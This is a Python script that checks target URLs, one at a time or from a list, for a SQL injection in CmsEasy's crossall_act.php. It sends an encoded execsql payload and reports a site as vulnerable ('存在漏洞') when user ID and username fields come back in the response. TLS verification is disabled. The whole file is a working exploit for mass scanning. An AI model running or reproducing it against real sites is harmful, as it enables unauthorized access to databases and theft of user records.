import requests
import argparse
from requests.exceptions import RequestException

requests.packages.urllib3.disable_warnings()


def check(target):
    url = '/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
               'Accept': '*/*'
              }
    try:
        resp = requests.get(target + url, timeout=30,
                            headers=headers, verify=False)
    except RequestException as e:
        print(e)
    try:
        if resp.status_code == 200 and 'userid' in resp.text and 'username' in resp.text:
            print(f'{target} 存在漏洞')
        else:
            print(f'{target} 不存在漏洞')
    except TypeError as e:
        print(e)


def main(args):
    if args.file:
        try:
            with open(args.file, 'r') as f:
                file_content = f.readlines()
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            exit(1)
        for f in file_content:
            check(f.strip())
    else:
        check(args.url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Check Cmseasy crossall_act.php sqli")
    parser.add_argument("-u", "--url", help="Test url")
    parser.add_argument("-f", "--file", help="Test Url File")  # txt文件

    args = parser.parse_args()
    main(args)
